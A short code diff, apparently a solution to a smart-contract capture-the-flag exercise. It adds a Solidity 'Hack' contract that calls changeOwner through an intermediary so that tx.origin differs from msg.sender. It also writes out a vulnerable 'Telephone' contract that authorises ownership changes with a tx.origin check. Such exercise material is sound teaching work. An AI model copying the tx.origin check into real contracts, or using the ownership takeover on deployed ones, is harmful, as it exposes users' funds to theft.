@@ -6,6 +6,8 @@ interface ITelephone {
     function changeOwner(address) external;
 }
 
+
+
 contract Hack {
     constructor(address _target) {
         // tx.origin = msg.sender
@@ -13,9 +15,20 @@ contract Hack {
         ITelephone(_target).changeOwner(msg.sender);
     }
 }
-/*
-function changeOwner(address _owner) public {
+
+   
+contract Telephone {
+
+  address public owner;
+
+  constructor() {
+    owner = msg.sender;
+  }
+
+  function changeOwner(address _owner) public {
     if (tx.origin != msg.sender) {
-        owner = _owner;
+      owner = _owner;
     }
-}*/
+  }
+}
+
